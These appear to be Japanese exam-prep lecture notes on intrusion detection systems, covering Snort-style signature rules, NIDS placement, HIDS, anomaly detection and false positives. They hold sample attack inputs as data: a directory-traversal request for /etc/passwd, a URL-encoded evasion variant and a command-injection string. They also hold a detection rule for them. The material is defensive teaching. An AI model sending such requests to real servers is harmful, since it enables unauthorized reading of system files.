# レクチャーノート：情報セキュリティ対策技術（1）侵入検知・防御 ― 5.6 侵入検知システム(IDS)

対応範囲：情報処理安全確保支援士試験 科目A-2（専門知識）・科目B（技能）「技術要素」＞「セキュリティ」＞「情報セキュリティ対策」（知識項目例：侵入検知/侵入防止、不正アクセス対策、ログ管理、セキュリティ製品・サービス〈ファイアウォール，WAF，DLP，SIEMほか〉）

## 0. 全体像 ― なぜこの分野を学ぶのか

5.5 で学んだファイアウォールは、「どの送信元から、どの宛先の、どのポートへの通信を通すか」を ACL（アクセス制御リスト）で決める**関所**でした。ところが、関所が「Webサーバの80番ポート宛てなら通してよい」と決めた瞬間、その80番ポートを通る通信の**中身**に攻撃が紛れていても、ファイアウォールは素通しにしてしまいます。5.5.5 の「ファイアウォールで防御できない攻撃」の表は、まさにこの死角の一覧でした。

**侵入検知システム**（Intrusion Detection System：**IDS**）は、この死角を見張るために生まれた製品です。IDSは、ネットワークやホストで発生している事象をリアルタイムに監視して侵入や攻撃を検知し、管理者に通知するなどのアクションを実行します。1.2 で整理した対策の4機能でいえば、ファイアウォールが「予防・防止」を担うのに対し、IDSは「**検知・追跡**」を担う装置です。

本ノートは次の順で進みます。

1. **IDSとは何か**：ファイアウォールのログでは攻撃が見えない理由と、IDSのシグネチャ（ルール）・アラートが実際にどう見えるかを確認し、5.5〜5.9 の製品の役割分担を表で整理します。
2. **NIDS（ネットワーク型）**：どこに置くと何が分かるのか、シグネチャ型とアノマリ型の検知の仕組みを学びます。
3. **HIDS（ホスト型）**：サーバの中で何を見張るのかを学び、NIDSと比較します。
4. **誤検知と見逃し**：フォールスポジティブとフォールスネガティブを具体例で理解します。
5. **限界と運用上の課題**：IDSが「できないこと」と、それを補う手段を整理します。この限界が、次の 5.7 IPS、5.8 WAF、5.9 サンドボックスへの橋渡しになります。

科目Bの4つの業務観点では、主に「③利用におけるセキュリティ対策の適用（セキュリティ監視とログ分析、ネットワーク及び機器のセキュリティ管理）」と「④インシデント管理（事象の評価〈検知・連絡受付、初動対応〉、証拠の収集と分析）」に対応します。科目A-2ではフォールスポジティブ／フォールスネガティブの識別、シグネチャ型とアノマリ型の違いが繰り返し出題されています。

## 1. IDSとは何か ― ファイアウォールの死角を見張る

### 1.1 ファイアウォールのログでは攻撃が見えない

一般的なIDSは、**1,000種類**を超える攻撃パターン（**シグネチャ**）のデータベースをもっています。IDSは、それらと実際の事象を照合することで、OSの脆弱性を突いた攻撃やファイルの改ざんなどを検知して記録します。また、IDSはメールをはじめとした様々な手段で管理者に警告を発することができます。

一方、ファイアウォールは攻撃の検知を目的とした製品ではなく、あくまでも**アクセス制御**を行う製品です。ファイアウォールのログに記録されるのは、主に中継／破棄したパケットの**ヘッダ情報**です。しかもその量は膨大であるため、管理者がやみくもにファイアウォールのログを解析しても、OSの脆弱性を突いた攻撃などを見つけ出すことはほぼ不可能に近いのです。

違いを実物で比べてみましょう。攻撃者が、Webサーバ（192.0.2.10）の脆弱なCGIを狙って、パスワードファイルを読み出そうとするリクエストを送ったとします（2.8 で学んだディレクトリトラバーサル攻撃です）。

```text
【攻撃者が送ったHTTPリクエスト】
GET /cgi-bin/view.cgi?file=../../../../etc/passwd HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
```

このとき、ファイアウォールのログには次のような1行しか残りません（書式は製品により異なります）。

```text
【ファイアウォールのログ（例）】
2026-09-30 10:15:42 ACCEPT TCP 203.0.113.45:51514 -> 192.0.2.10:80 rule=allow-web-in
```

ファイアウォールが見ているのは「送信元 203.0.113.45 から、192.0.2.10 の80番ポートへのTCP通信を、ルール allow-web-in に従って通した」という事実だけです。この1行は、正常な閲覧者のアクセスとまったく同じ形をしています。これに対してIDSは、パケットの**ペイロード（中身）**まで調べ、`../../etc/passwd` という攻撃に特徴的な文字列を見つけてアラートを上げます。

> **シグネチャ(signature)**
> 既知の攻撃や不正アクセスに特徴的なパケットの内容・パターンを定義したもの。IDSやウイルス対策ソフトは、シグネチャと実際のデータを照合して攻撃やマルウェアを検知する。

### 1.2 シグネチャとアラートの見た目

シグネチャは、実際には「どの通信の、どこに、どんな文字列やパターンがあったら、どんなメッセージで警告するか」を書いた**ルール**です。オープンソースのIDSとして広く使われている Snort や Suricata のルールは、次のような形をしています（学習用に簡略化した例です）。

```text
【IDSのシグネチャ（ルール）の例：Snort/Suricata形式】
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"WEB-ATTACKS /etc/passwd access attempt"; flow:to_server,established; content:"/etc/passwd"; nocase; classtype:attempted-recon; sid:1000001; rev:1;)
```

| 部分 | 意味 |
|---|---|
| `alert` | 一致したらアラートを上げる（記録・通知する） |
| `tcp $EXTERNAL_NET any -> $HOME_NET 80` | 外部の任意ポートから、内部ネットワークの80番ポートへのTCP通信を対象にする（ここまではファイアウォールのACLとよく似たヘッダ条件） |
| `flow:to_server,established` | 確立済みのTCPコネクションで、サーバ向きの通信だけを見る |
| `content:"/etc/passwd"; nocase` | ペイロードに `/etc/passwd` という文字列が含まれるか（大文字・小文字を区別しない）。ここがファイアウォールにはない「中身の検査」 |
| `msg:` / `classtype:` | アラートに表示するメッセージと、攻撃の分類 |
| `sid:` / `rev:` | ルールの識別番号と改訂番号（利用者が独自に作るルールには 1000000 以上の番号を使うのが慣例） |

このルールに一致する通信が流れると、IDSは次のような**アラート**を1行出力します。

```text
【IDSのアラートの例（Snortの簡易出力形式）】
09/30-10:15:42.123456  [**] [1:1000001:1] WEB-ATTACKS /etc/passwd access attempt [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 203.0.113.45:51514 -> 192.0.2.10:80
```

アラートの1行からは、「いつ（09/30 10:15:42）」「どのルールで（sid 1000001）」「何の攻撃として（/etc/passwd へのアクセス試行）」「どの程度重要か（Priority 2）」「誰から誰へ（203.0.113.45 から 192.0.2.10 の80番ポートへ）」が読み取れます。科目Bでは、このようなアラートやログの抜粋を示して「どの攻撃が行われたか」「攻撃は成功したか」を問う設問がよく出ます。ここで注意したいのは、アラートは「攻撃が**試みられた**」ことを示すだけで、「攻撃が**成功した**」ことまでは示さないという点です（本ノート「5. 機能上の限界」の NIDS ⑤で詳しく扱います）。

### 1.3 5.5〜5.9 の製品の役割分担 ― 何が・何を見て・何を止めるか

第5章の後半で学ぶ製品は、どれも「ネットワークの出入口で不正を防ぐ」ものなので混同しがちです。見分けるコツは、「**何が**（どの装置が）」「**何を見て**（どの情報を根拠に）」「**何を止めるか**（どんな攻撃に効くか）」の3点で比べることです。

| 何が | 主な配置 | 何を見て | 何を止める（検知する）か | 止められない代表例 | 対応する第2章の攻撃 |
|---|---|---|---|---|---|
| **ファイアウォール**（5.5） | 経路上（インライン） | IPアドレス・ポート番号・プロトコル・コネクション状態（ヘッダ） | ACLで許可していない通信を遮断する | 許可したポート（80/443など）の中に紛れた攻撃 | 2.2 ポートスキャンの一部（閉じたポートへの到達を防ぐ）、2.7 DoS の一部（SYN Flood 対策機能など） |
| **IDS**（5.6） | 経路外（ミラーポート）、またはホスト上 | パケットのペイロード、ホストのログやファイルの変化 | 既知の攻撃パターンや異常を**検知して通知**する（遮断は原則しない） | ゼロデイ攻撃、独自アプリの脆弱性を突く攻撃、暗号化通信の中身 | 2.2 ポートスキャン、2.3 BOF攻撃、2.4 パスワードクラック、2.7 DoS攻撃の検知 |
| **IPS**（5.7） | 経路上（インライン） | IDSと同じ（ペイロード、プロトコルの異常） | 攻撃と判断した通信を**その場で遮断**する | IDSと同じ弱点。誤検知すると正常通信まで止める | 2.2、2.3、2.7 などの遮断、パッチ未適用システムの仮想パッチ |
| **WAF**（5.8） | Webサーバの前段（インライン） | HTTPリクエスト／レスポンスの中身（URL、パラメータ、Cookie、ヘッダ） | Webアプリケーションへの攻撃を遮断する | アプリ固有のロジックの欠陥、Web以外のプロトコル | 2.8 XSS、SQLインジェクション、OSコマンドインジェクション、ディレクトリトラバーサル |
| **サンドボックス**（5.9） | メール・Webの経路上、または経路外 | 不審なファイルを実際に動かしたときの**振る舞い** | 未知のマルウェアや亜種を検知・遮断する | サンドボックス回避機能をもつマルウェア、暗号化ファイル | 2.9 マルウェア、標的型攻撃 |

この表の「止められない代表例」の列が、次の製品が生まれた理由になっていることに注目してください。ファイアウォールが中身を見ないからIDSが生まれ、IDSが止められないからIPSが生まれ、IPSが汎用のシグネチャでは独自Webアプリを守れないからWAFが生まれ、どれもがパターンに頼るため未知のマルウェアに弱いからサンドボックスが生まれました。1.2 で学んだ**多層防御**は、これらを重ねて互いの死角を埋める考え方です。

## 2. NIDS ― ネットワークを流れるパケットを見張る

IDSは、その動作形態や監視対象によって、次の二つに分類できます。

- **ネットワーク型侵入検知システム**（Network-Based Intrusion Detection System：**NIDS**）
- **ホスト型侵入検知システム**（Host-Based Intrusion Detection System：**HIDS**）

まず、ネットワーク全体を見張る NIDS から見ていきます。

### 2.1 NIDSの仕組み ― センサ・コンソール・防御機能

管理者は、NIDSを監視の対象となるネットワークセグメントに接続して使用します。NIDSの**センサ**は、セグメント上を流れるパケットを取り込んでリアルタイムに監視し、あらかじめ設定されたルール（**監視のポリシ**）に基づいて不正アクセスや不審な事象を検知します。センサは、自分宛てではないパケットも含めてすべて取り込むために、ネットワークインタフェースをプロミスキャスモードで動かし、スイッチのミラーポート（SPANポート）などにつながれるのが一般的です（5.7 で詳しく扱います）。

NIDSは、検知した結果を**マネジメントコンソール**（管理用のソフトウェアがインストールされた端末）の画面やメールによって管理者に通知します。製品によっては、TCPコネクションの強制切断（**RSTパケット**の送信）や、ファイアウォールと連携した通信の遮断といった防御機能をもつものもあります。ただし、NIDSは通信経路の外から「のぞき見」している装置なので、この防御機能には限界があります（本ノート「5. 機能上の限界」の NIDS ⑥）。

**図：NIDSのイメージ**

```text
          インターネット
                │
        ┌───────┴───────┐
        │ バリアセグメント│──[NIDS①]
        └───────┬───────┘
                │
         ┌──────┴──────┐
         │ファイアウォール│
         └──┬───────┬──┘
            │       │
   ┌────────┴┐   ┌──┴─────────┐
   │   DMZ   │   │内部セグメント│
   │(公開サーバ)│   │   (LAN)    │
   └────┬────┘   └─────┬──────┘
     [NIDS②]         [NIDS③]

   ※各NIDSセンサの検知結果はマネジメントコンソールへ通知
```

### 2.2 接続場所と監視方法 ― どこに置くと何が分かるか

NIDSには適当な接続場所があり、接続場所に応じて監視すべきシグネチャも変わります。管理者は「その場所で何を知りたいのか」を決めてから、センサを置く場所と監視対象を決めるべきです。

**① バリアセグメントに接続**：管理者がNIDSを**バリアセグメント**（インターネットとファイアウォールの間のセグメント）に接続すると、インターネットから自分のサイトに対して、どのような攻撃がどの程度行われているのかを知ることができます。したがって、この位置では基本的にはすべてのシグネチャを監視対象とします。

ただし、この位置で検知される攻撃の多くは、ファイアウォールによって破棄されるものです。実際にどの攻撃がファイアウォールを通過したのかは、DMZでの監視結果と比較して初めて分かることであり、バリアセグメントの監視結果だけでは実態は分かりません。したがって、DMZで監視を行わないのであれば、この構成で監視を行う意味はありません。

**② DMZに接続**：管理者がNIDSを**DMZ**に接続すると、ファイアウォールを通過してDMZに対して行われる攻撃を検知できます。前掲の図のネットワーク構成では、この位置で監視を行うことが最も重要です。つまり、このネットワークにNIDSを1台だけ導入するならば、DMZに接続する構成をとるのが必須です。なぜなら、公開サーバは外部から直接アクセスされるため最も狙われやすく、しかもここで検知されるのは「ファイアウォールをすり抜けた、本当に危険な攻撃」だからです。

この場合、管理者は次のプロトコルに関するシグネチャを監視対象として設定しておけばよいでしょう。

- ファイアウォールがインターネットからDMZに中継している（DMZでサービスを提供している）プロトコル
- ファイアウォールがDMZからインターネット側に中継しているプロトコル

たとえばファイアウォールがDMZ宛てに HTTP/HTTPS（80/443番）、SMTP（25番）、DNS（53番）だけを通しているなら、NIDSで telnet（23番）への攻撃シグネチャを監視しても、その通信はそもそもDMZに届かないので無駄になります。監視対象を絞ることは、後述するパケット取りこぼしの対策にもなります。

**③ 内部セグメントに接続**：管理者がNIDSを内部セグメントに接続すると、LANの中を飛び交う不正なパケットを検知できます。近年、悪質なマルウェアのまん延が大きな問題となっていますが、NIDSで内部セグメントを監視することで、感染端末が他の端末を探索する通信（2.9 で学んだワームの感染拡大や、2.2 のポートスキャン）や、C&Cサーバへの通信のような事象を発見できる可能性があります。この構成では、基本的にはすべてのシグネチャを監視対象としておく必要があるでしょう。

| 接続場所 | 分かること | 監視するシグネチャ | 位置づけ |
|---|---|---|---|
| ① バリアセグメント | インターネットからどんな攻撃がどの程度来ているか | 基本的にすべて | DMZの監視結果と比較して初めて意味をもつ |
| ② DMZ | ファイアウォールを通過して公開サーバに届いた攻撃 | FWがDMZとの間で中継しているプロトコル | 1台だけ導入するならここが必須 |
| ③ 内部セグメント | LAN内の不正なパケット、マルウェアのまん延 | 基本的にすべて | 内部感染・内部不正の早期発見 |

> **バリアセグメント/DMZ**
> バリアセグメントは、インターネットとファイアウォールの間に位置するセグメントである。DMZ(DeMilitarized Zone:非武装地帯)は、ファイアウォールによってインターネットと内部LANの双方から隔離されたセグメントであり、Webサーバやメールサーバなどの公開サーバを設置する。

### 2.3 検知の仕組み① ― シグネチャとのパターンマッチング

一般的なNIDSは主に、次の二つの手法を用いて攻撃や不正アクセスを検知します。

- **シグネチャとのパターンマッチング**
- **異常検知**（**アノマリ検知**）

**シグネチャとのパターンマッチング**とは、NIDSが取り込んだパケットと、NIDSに登録された膨大な数のシグネチャとを比較し、不正アクセスを検知する手法です。NIDSは、パケットがシグネチャと一致した場合に攻撃として検知します。この手法は**不正検知**（**ミスユース検知**）とも呼ばれます。本ノート 1.2 で見た Snort のルールは、まさにこの方式のシグネチャです。

パターンマッチングによって検知可能な事象には、次のようなものがあります。第2章で学んだ攻撃と対応させておきましょう。

| 検知可能な事象 | 対応する第2章の攻撃 | シグネチャが着目する特徴の例 |
|---|---|---|
| ポートスキャン | 2.2 ポートスキャン | 同じ送信元から短時間に多数のポートへ SYN パケットが届く |
| OSやサーバソフトウェアの既知の脆弱性を突いた攻撃（BOF攻撃など） | 2.3 バッファオーバフロー攻撃 | 異常に長い入力値、NOP命令（0x90）の連続などのシェルコードの特徴 |
| サーバソフトウェアに対する不正なコマンドの発行 | 2.8 OSコマンドインジェクションなど | `;cat /etc/passwd` のようなコマンド文字列 |
| ネットワークを通じて行われるパスワードクラッキング | 2.4 パスワードクラック | 同じ送信元からのログイン失敗応答の多発 |
| パケットを偽装するタイプのDoS攻撃 | 2.7 DoS攻撃（Land攻撃など） | 送信元と宛先のIPアドレスが同じ、など仕様上ありえないヘッダ |

たとえば 2.2 で学んだ nmap による SYN スキャンを受けると、NIDSは次のようなアラートを上げます（Snort のポートスキャン検知機能の出力を簡略化した例）。

```text
09/30-02:03:11.482915  [**] [122:1:1] (portscan) TCP Portscan [**] [Priority: 3] {PROTO:255} 203.0.113.77 -> 192.0.2.10
```

パターンマッチングによる検知には、次の留意点があります。

- シグネチャを常に最新状態にアップデートしておく必要がある
- **未知の攻撃**は検知できない
- **サイト独自のアプリケーション**の脆弱性を突いた攻撃は検知できない

なぜなら、シグネチャはベンダが既知の攻撃を分析して作成するものだからです。そのため、シグネチャが提供されていない新たな攻撃（**ゼロデイ攻撃**など）は検知できません。また、シグネチャの多くは、広く利用されているOSや市販のサーバソフトウェアに対する攻撃パターンです。したがって、組織がサイト用に独自の仕様で開発したアプリケーションプログラムの脆弱性を突いた攻撃などは、パターンマッチングでは検知できません。

シグネチャについては、製品にプリセットされたものに加え、**独自のシグネチャ**を登録できる製品もあります。管理者が独自シグネチャを登録すれば、サイト独自のアプリケーションプログラムの脆弱性を突いた攻撃なども検知できる可能性があります。たとえば自社の受注システムに `/order/admin.jsp` という管理画面があり、外部からは本来アクセスされないはずなら、「外部からこのURLへのアクセスがあったら警告する」というルールを本ノート 1.2 の形式で書き足すことができます。

### 2.4 検知の仕組み② ― 異常検知（アノマリ検知）

**異常検知**（**アノマリ検知**）とは、NIDSが取り込んだパケットを**RFC**のプロトコル仕様など（**正常なパターン**）と比較し、仕様から逸脱したものを異常として検知する手法です。製品によっては、平常時の通信量や通信先を学習して作った「ふだんの状態（ベースライン）」を正常なパターンとして使うものもあります。アノマリ検知を行うことで、次のような事象を検知できる可能性があります。

- 単体では正常なパケットを大量に送り付けるタイプのDoS攻撃
- シグネチャに含まれていない未知の攻撃
- 侵入を許してしまったことによるシステムの異常な振る舞い

アノマリ検知によって検知可能な事象には、次のようなものがあります。

- 大量に発行されたコマンド
- プロトコルの仕様に反したデータの流れ
- プロトコルの仕様に従っていないヘッダ情報をもつパケット
- 異常な数の応答パケット など

たとえば、2.7 で学んだ SYN Flood 攻撃の1つ1つの SYN パケットは、仕様上は正常なパケットです。シグネチャ型では「このパケットは攻撃だ」と判定できませんが、アノマリ型なら「平常時は毎秒数十件の SYN が、今は毎秒数万件届いている」という量の異常として検知できます。また、DNS の応答パケットが問い合わせもしていないのに大量に届く状況（2.7 の DNS リフレクション攻撃）も、「異常な数の応答パケット」として検知の対象になります。

ただし、アノマリ検知では、正常状態の判断基準によっては誤報が多くなる可能性がある点に留意する必要があります。月末の締め処理やキャンペーン初日のように、正当な理由で通信が急増する日は、アノマリ型IDSにとって「異常」に見えてしまうからです。

| 観点 | シグネチャ型（ミスユース検知） | アノマリ型（異常検知） |
|---|---|---|
| 比べる相手 | 攻撃のパターン（ブラックリスト） | 正常なパターン（RFCの仕様、平常時の状態） |
| 判定の考え方 | 「攻撃の特徴に一致したら不正」 | 「正常から外れたら不正」 |
| 得意なもの | 既知の攻撃を高い精度で検知 | 未知の攻撃、大量送信型のDoS、侵入後の異常な振る舞い |
| 苦手なもの | ゼロデイ攻撃、独自アプリへの攻撃 | 正当な通信の急増などによる誤報 |
| 運用の手間 | シグネチャの継続的な更新 | 正常状態の定義・学習とチューニング |

この対比は、2.9 で学んだマルウェア検出手法の「パターンマッチング」と「ビヘイビア法（振る舞い検知）」の関係と同じ発想です。5.9 のサンドボックスは、振る舞いで判定する側の代表例です。

> **BOF攻撃(Buffer Overflow攻撃)**
> プログラムが確保したバッファ領域を超えるデータを送り込み、メモリ上の制御情報を書き換えて、任意のコードを実行させたりプログラムを異常終了させたりする攻撃である。

## 3. HIDS ― サーバの中で起きたことを見張る

### 3.1 HIDSの仕組みと検知項目

管理者は、HIDSを監視の対象となるホスト（Webサーバ、DBサーバ、メールサーバなど）にインストールして使用します。HIDSは、インストールされたホストに常駐して、発生している事象をリアルタイムに監視し、あらかじめ設定されたルール（監視のポリシ）に基づいて、不正な操作やファイルの改ざんなどを検知します。

また、HIDSによっては、ファイアウォールやルータの**syslog**、**SNMPトラップ**などを集約し、ネットワーク全体の状態（障害の発生状況など）を監視する機能をもつものもあります。HIDSは、検知後はNIDSと同様に様々なアクションをとることができます。

**図：HIDSのイメージ**

```text
  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
  │  Webサーバ    │  │  DBサーバ     │  │ メールサーバ   │
  │ [HIDSエージェント]│  │ [HIDSエージェント]│  │ [HIDSエージェント]│
  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘
         │ 検知結果の通知      │                 │
         └────────────┬─────┴─────────────────┘
                      │
           ┌──────────┴──────────┐
           │ マネジメントコンソール │ ← syslog/SNMPトラップ
           └─────────────────────┘   (ファイアウォール、ルータなど)
```

HIDSの主な検知項目は次のとおりです。

- ログインの成功／失敗
- 重要なリソース（ファイル、ディレクトリなど）へのアクセス
- 不正なプログラムのインストール
- システムディレクトリに存在するファイルの書換え／削除
- Webコンテンツの改ざん
- ネットワーク環境で発生している障害

HIDSは、これらの事象の検知に、OSの**ロギング機能**やセキュリティ機能を用いています。つまりHIDSは、OSが出すログを読み、ファイルのハッシュ値を定期的に計算し直して、「いつもと違う」ことを見つける装置です。実際にHIDSが読むログと、HIDSが出すアラートは次のような形をしています（HIDSのアラートは製品により書式が異なるため、項目の例として示します）。

```text
【HIDSが読むOSのログ（Linuxの認証ログの例）】
Sep 30 03:12:45 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.77 port 50122 ssh2
Sep 30 03:12:47 web01 sshd[2213]: Failed password for invalid user oracle from 203.0.113.77 port 50130 ssh2
（同じ送信元から数分間に数百行続く）

【HIDSのアラートの例：ログイン失敗の多発】
2026-09-30 03:15:00 host=web01 level=10 rule="SSH ブルートフォースの疑い（同一送信元から2分間に8回以上の認証失敗）" srcip=203.0.113.77

【HIDSのアラートの例：ファイル改ざんの検知（ファイル完全性監視）】
2026-09-30 04:00:02 host=web01 level=7 rule="監視対象ファイルのハッシュ値が変化"
  file=/var/www/html/index.html
  sha256(前回)=9f2c...e1a0  sha256(今回)=41bd...77c3  owner=apache
```

1本目は 2.4 で学んだパスワードクラック（オンライン攻撃）の痕跡、2本目は Webコンテンツの改ざんの痕跡です。どちらも、ネットワークを流れるパケットを見ているだけのNIDSでは「結果として何が起きたか」を確認できない事象です。

> **syslog/SNMPトラップ**
> syslogは、機器やOSが発生させたログメッセージをネットワーク経由で収集・転送するための仕組みである。SNMPトラップは、SNMPエージェントが障害などの事象を検知した際に、管理マネージャへ自発的に通知するメッセージである。

### 3.2 NIDSとHIDSの比較

ここまで見てきた NIDS と HIDS を、主に検知機能の面で比較して表にまとめておきます。まず、両者がどこに置かれ、何を見ているのかを1枚の図で確認しましょう。

```text
【NIDSとHIDSの配置図】

   インターネット
        │
   [ファイアウォール]
        │
   ┌────┴─────────────── DMZ ───────────────┐
   │  [L2スイッチ]──(ミラーポート)──[NIDSセンサ]  ← セグメントを流れる
   │     │         │                            全パケットのコピーを見る
   │  ┌──┴─────┐ ┌─┴───────┐
   │  │Webサーバ│ │メールサーバ│
   │  │ [HIDS] │ │ [HIDS]  │ ← 各ホストの中のログ・ファイル・
   │  └────────┘ └─────────┘   プロセスを見る
   └───────────────────────────────────────────┘
        │                   │
        └──── 検知結果 ──────┴──→ [マネジメントコンソール] → 管理者へ通知
```

**表：NIDSとHIDSの比較**

| 項目 | NIDS | HIDS |
|---|---|---|
| 導入方法 | 監視の対象となるネットワークセグメントに接続(専用のハードウェアが必要) | 監視の対象となるホストにインストール(専用のハードウェアは不要) |
| 監視方法 | 流れているパケットを監視(暗号化されたパケットは一部の上位機種でのみ監視可能) | 常駐しているホストのログ、ファイル操作やポートの状態などを監視 |
| ポートスキャン | ○ | △ |
| BOF攻撃 | ○ | △ |
| DoS攻撃 | ○ | △ |
| サーバプログラムへの各種コマンドの発行 | ○ | △ |
| ログインの成功/失敗 | △ | ○ |
| SQLインジェクション | △(独自にシグネチャを登録した場合には検知できる可能性あり) | △(DBサーバ上で監視すれば検知できる可能性あり) |
| 重要なリソースへのアクセス | × | ○ |
| 不正なプログラムのインストール | × | ○ |
| Webコンテンツの改ざん | × | ○ |
| メールによるファイルの流出 | △(不正な処理の内容による) | × |

○:検知可能 △:条件によっては検知可能 ×:検知困難

導入方法の行にある「NIDSは専用のハードウェアが必要」という記述について補足します。以前はNIDSといえば専用アプライアンス（専用機）が前提でしたが、現在は Snort や Suricata のようなソフトウェアを汎用サーバで動かす形や、仮想アプライアンスとして仮想化基盤・クラウド上に置く形も一般的です。「NIDSはネットワークに1台（1センサ）置けば広い範囲を見られる、HIDSはホストの数だけ入れる必要がある」という対比のほうが、本質的な違いとして重要です。

表を読むときのコツは、「NIDSはネットワーク上の**原因（攻撃の試み）**に強く、HIDSはホスト上の**結果（何が起きたか）**に強い」と捉えることです。ポートスキャンやBOF攻撃はネットワークを流れるパケットそのものに特徴が出るので NIDS が得意です。一方、ファイルの改ざんや不正なプログラムのインストールは、ホストの中で起きる出来事なので HIDS でなければ見えません。

### 3.3 NIDSとHIDSの効果的な活用方法 ― 組み合わせて「発見」から「分析」へ

管理者は、NIDSとHIDSの特徴を把握し、両者を組み合わせることで、監視効果をより高められます。

例えば、NIDSは、OSの脆弱性を突いた攻撃をはじめ、非常に多くの不正アクセスを検知できます。しかし、NIDSだけでは、その不正アクセスによって実際にどのような被害や影響があったのかを特定するのは困難です。攻撃による影響を知るには、攻撃の対象となったサーバのログか、そのサーバを監視しているHIDSの検知結果を併用するのが効果的です。

本ノート 1.1 の例で考えてみましょう。NIDSが「10:15:42 に 203.0.113.45 から /etc/passwd へのアクセス試行」というアラートを出したとします。管理者が同時刻の Webサーバのアクセスログを確認すると、次のどちらかが見つかるはずです。

```text
【攻撃が失敗した場合（Webサーバのアクセスログ）】
203.0.113.45 - - [30/Sep/2026:10:15:42 +0900] "GET /cgi-bin/view.cgi?file=../../../../etc/passwd HTTP/1.1" 403 199 "-" "Mozilla/5.0"

【攻撃が成功した可能性がある場合】
203.0.113.45 - - [30/Sep/2026:10:15:42 +0900] "GET /cgi-bin/view.cgi?file=../../../../etc/passwd HTTP/1.1" 200 2143 "-" "Mozilla/5.0"
```

ステータスコードが 403（拒否）で応答サイズが小さければ攻撃は失敗しており、200（成功）で応答サイズが /etc/passwd 程度の大きさなら、ファイルの中身が送り返された可能性が高いと判断できます。このように、NIDSとHIDS（やサーバのログ）の両方をうまく組み合わせることで、管理者は不正アクセスを発見するだけでなく、その被害状況や侵入手口を分析できるようになります。現在では、NIDS・HIDS・ファイアウォール・サーバのログを **SIEM**（Security Information and Event Management）に集約し、時刻や IPアドレスで自動的に突き合わせる運用が一般的です。

## 4. 誤検知と見逃し ― フォールスポジティブとフォールスネガティブ

IDSを運用するうえで避けて通れないのが、誤検知（誤報）と見逃しの問題です。NIDSでは、監視対象となる事象が多様で複雑であるため、ある程度の誤検知や誤報は避けられません（原本では NIDS の課題「① 誤検知への対応」として扱われている内容です）。

### 4.1 二つの指標

IDSの誤検知の割合を測る指標として、次の二つがあります。

- **フォールスポジティブ（false positive）**：IDSが本来検知すべきではない事象、つまり不正ではない事象を、不正行為として検知してしまうこと（**誤検知**）
- **フォールスネガティブ（false negative）**：本来検知すべき不正行為を見逃してしまうこと（**見逃し**、検知漏れ）

> **フォールスポジティブとフォールスネガティブ**
>
> | | 実際に不正あり | 実際に不正なし |
> |---|---|---|
> | 不正と判定 | 正しい検知(true positive) | フォールスポジティブ(誤検知) |
> | 正常と判定 | フォールスネガティブ(見逃し) | 正しい判定(true negative) |

覚え方は、「ポジティブ／ネガティブ」はIDSの**判定**（不正あり＝陽性／不正なし＝陰性）、「フォールス」はその判定が**間違っていた**ことを表す、と分解することです。「フォールスポジティブ」は「陽性と判定したが間違い（本当は正常）」、「フォールスネガティブ」は「陰性と判定したが間違い（本当は攻撃）」です。

### 4.2 具体例で見る

| 種類 | 具体例 | なぜ起きたか |
|---|---|---|
| フォールスポジティブ | 自社のセキュリティ担当者が 5.3 の脆弱性診断ツールでDMZのサーバを検査したところ、NIDSが数百件の「攻撃」アラートを出した | 診断ツールは本物の攻撃と同じ文字列を送るため、IDSには区別がつかない |
| フォールスポジティブ | 社内のLinux技術ブログに「/etc/passwd の書式」という記事を投稿したところ、本ノート 1.2 のルール（sid 1000001）に一致してアラートが出た | ルールが「文字列 /etc/passwd を含むか」しか見ておらず、文脈を区別できない |
| フォールスポジティブ | 月末の夜間バッチで、ファイルサーバへの接続が平常時の50倍に増え、アノマリ型IDSが「DoS攻撃の疑い」と警告した | 正常状態の基準（ベースライン）に、月末の業務パターンが含まれていなかった |
| フォールスネガティブ | 公開されたばかりの脆弱性を突く攻撃（ゼロデイ攻撃）を受けたが、アラートが出なかった | その攻撃のシグネチャがまだベンダから提供されていない |
| フォールスネガティブ | 攻撃者が `../../etc/passwd` を `..%2f..%2fetc%2fpasswd` のようにURLエンコードし、さらにHTTPSで送ってきたため検知できなかった | IDSが文字列を正規化せず、暗号化された通信の中身も見られない |
| フォールスネガティブ | 攻撃者が正規の管理者アカウントを盗み、通常の業務時間に通常の操作でデータを持ち出した | 行為そのものが「正常な操作」と区別できない（本ノート「5. 機能上の限界」の NIDS ⑦） |

### 4.3 トレードオフとチューニング

フォールスポジティブが多いと、大量の誤報が発生して管理者の負担が増え、本当に重要な警告が埋もれてしまいます。一方、フォールスネガティブが多いと、実際の攻撃を見逃すことになります。両者は**トレードオフ**の関係にあることが多いのです。検知の条件を厳しく（広く）すれば見逃しは減りますが誤報が増え、条件を緩く（狭く）すれば誤報は減りますが見逃しが増えます。

そのため、管理者は、自組織のネットワーク環境や提供サービスに合わせて監視ポリシやシグネチャを見直し、フォールスポジティブとフォールスネガティブを最小にするよう継続的に**チューニング**を行っていく必要があります。上の具体例に対応するチューニングの例は次のとおりです。

- 脆弱性診断による誤報は、管理者が診断元の IPアドレスと診断日時を事前に登録し、その間のアラートを「診断による既知の事象」として除外する。
- 技術ブログの誤報は、管理者がルールの対象を「CGIのパラメータ部分」に絞るなど、条件を具体化する。
- 月末バッチの誤報は、管理者がベースラインに月末の業務パターンを学習させる、または該当する通信を除外する。
- 見逃しを減らすために、管理者はシグネチャを自動更新にし、HTTPの正規化機能（エンコードを元に戻してから照合する機能）を有効にする。

## 5. IDSの機能上の限界及び運用上の課題

IDSには、一般に次のような機能上の限界や運用上の課題があることが認識されています。ここで挙げる限界の多くは、5.7〜5.9 の製品や他の対策で補うことになるため、「限界 → 誰が何で補うか」をセットで覚えてください。

### 5.1 NIDSの機能上の限界と運用上の課題

NIDSには、前節の「① 誤検知への対応」（フォールスポジティブとフォールスネガティブ）に加えて、次のような機能上の限界や運用上の課題があります。

